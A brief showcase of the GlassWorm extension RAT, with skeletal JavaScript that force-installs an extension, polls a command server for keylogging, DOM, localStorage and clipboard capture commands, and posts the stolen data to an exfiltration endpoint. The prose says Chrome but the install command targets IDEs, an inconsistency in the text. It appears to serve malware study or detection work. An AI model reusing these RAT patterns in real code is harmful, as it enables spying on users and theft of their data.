# GlassWorm Chrome Extension RAT
This showcase demonstrates the GlassWorm Chrome extension RAT discovered by
Aikido Security (March 2026). The malware force-installs a Chrome extension
masquerading as Google Docs Offline that functions as a full RAT with
keylogging, cookie theft, and Solana-based C2.

## Extension force-install and RAT commands
```javascript
// Force-install the extension into all detected IDEs
const cmd = `code --install-extension --force ${extensionPath}`;
exec(cmd);

// RAT command handler polling C2
async function pollCommands() {
  const resp = await fetch(`/api/commands?agent_id=${agentId}`);
  const cmds = await resp.json();
  for (const cmd of cmds) {
    switch (cmd.action) {
      case 'startkeylogger':
        startKeylogger();
        break;
      case 'domsnapshot':
        exfilDom();
        break;
      case 'localstoragedump':
        dumpLocalStorage();
        break;
      case 'capture_clipboard':
        captureClipboard();
        break;
    }
  }
}

// Exfiltrate collected data
async function exfil(data) {
  await fetch('/api/exfil', {
    method: 'POST',
    body: JSON.stringify({ agent_id: agentId, action: data.type, payload: data })
  });
}
```
